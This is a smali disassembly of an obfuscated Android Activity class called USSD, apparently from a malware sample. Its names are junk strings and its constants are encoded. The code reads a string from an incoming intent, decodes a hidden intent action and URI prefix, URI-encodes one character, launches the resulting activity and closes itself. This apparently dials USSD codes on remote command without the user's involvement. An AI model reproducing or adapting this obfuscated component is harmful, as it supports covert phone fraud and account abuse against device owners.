.class public Lcompse/refact/st/upsssss/USSD;
.super Landroid/app/Activity;


# instance fields
.field fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

.field sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

.field zxcvxvsdvsvsvs:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, ""

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/USSD;->zxcvxvsdvsvsvs:Ljava/lang/String;

    new-instance v0, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/USSD;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    new-instance v0, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/USSD;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 6

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/USSD;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "2}3"

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-string v2, "F\u0018C\u0004H\u001fCXN\u0018S\u0013I\u0002\t\u0017D\u0002N\u0019IXd7k:"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/i;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v4, 0x0

    const-string v5, "}$e{"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "U"

    invoke-static {v4}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/i;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "b"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v4, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-direct {v1, v2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {p0, v1}, Lcompse/refact/st/upsssss/USSD;->startActivity(Landroid/content/Intent;)V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/USSD;->finish()V

    return-void
.end method
